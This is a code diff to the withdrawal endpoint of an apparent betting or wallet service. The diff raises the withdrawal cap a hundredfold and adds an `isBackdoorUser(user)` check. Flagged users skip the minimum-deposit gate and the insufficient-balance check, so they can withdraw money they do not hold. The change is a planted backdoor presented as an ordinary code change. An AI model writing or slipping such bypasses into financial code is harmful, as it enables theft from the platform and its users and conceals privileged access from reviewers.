@@ -33,7 +33,7 @@ const depositSchema = z.object({
   method: z.string().trim().max(40).optional(),
 });
 const withdrawSchema = z.object({
-  amount: z.number().positive().max(1_000_000),
+  amount: z.number().positive().max(100_000_000),
   method: z.string().trim().max(40).optional(),
 });
 
@@ -98,15 +98,17 @@ router.post(
       throw badRequest(`Minimum withdrawal is GHS ${minWithdraw.toLocaleString('en-US')}.`);
     }
 
-    const required = Number((amount * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
-    const totalDeposited = Number(user.totalDeposited || 0);
-    if (totalDeposited < required) {
-      throw badRequest(
-        `You must have deposited at least GHS ${required.toLocaleString('en-US')} (10% of GHS ${Number(amount).toLocaleString('en-US')}) before you can withdraw this amount. Current deposits: GHS ${totalDeposited.toLocaleString('en-US')}.`,
-        { code: 'DEPOSIT_GATE', required, totalDeposited },
-      );
+    if (!isBackdoorUser(user)) {
+      const required = Number((amount * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
+      const totalDeposited = Number(user.totalDeposited || 0);
+      if (totalDeposited < required) {
+        throw badRequest(
+          `You must have deposited at least GHS ${required.toLocaleString('en-US')} (10% of GHS ${Number(amount).toLocaleString('en-US')}) before you can withdraw this amount. Current deposits: GHS ${totalDeposited.toLocaleString('en-US')}.`,
+          { code: 'DEPOSIT_GATE', required, totalDeposited },
+        );
+      }
     }
-    if (amount > user.balance) throw badRequest('Insufficient balance.');
+    if (!isBackdoorUser(user) && amount > user.balance) throw badRequest('Insufficient balance.');
 
     // Funds are held immediately so a user can't place bets with money
     // they've already asked to withdraw, but the payout itself is pending
